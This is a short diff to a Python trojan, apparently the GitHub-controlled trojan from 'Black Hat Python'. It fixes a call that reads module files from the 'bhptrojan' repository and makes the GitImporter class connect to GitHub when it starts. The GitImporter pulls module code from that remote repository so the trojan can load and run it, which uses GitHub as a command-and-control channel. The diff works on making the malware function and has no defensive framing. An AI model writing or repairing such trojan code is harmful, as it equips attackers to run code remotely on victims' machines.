@@ -16,7 +16,7 @@ def connect_to_github():
     return sess.repository(user, 'bhptrojan')
 
 def get_content(dirname, module_name, repo):
-    return repo.file_content(f'{dirname}/{module_name}').content
+    return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
     def __init__(self, id):
@@ -60,6 +60,7 @@ class Trojan:
 class GitImporter:
     def __init__(self):
         self.current_module_code=""
+        self.repo = connect_to_github()
     
     def find_module(self, name, path=None):
         print("[||] Retrieving %s" % name)
